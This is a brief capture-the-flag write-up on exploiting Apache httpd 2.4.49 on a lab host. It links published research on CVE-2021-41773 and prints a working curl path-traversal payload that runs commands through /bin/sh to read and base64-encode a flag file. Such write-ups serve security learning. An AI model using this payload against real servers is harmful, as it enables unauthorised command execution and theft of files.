# 10 of clubs

> Solved by: Starry-Lord

```
port 12380
```

This port was using Apache httpd 2.4.49 and I found a good research on the subject here:

https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013


I didn't need to get a shell. ls and cat commands were enough to extract the png:


```
curl -vv 'http://172.17.15.117:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo; cat ../secret/safe/flag.png|base64'
```

![](https://i.imgur.com/aYyIBok.png)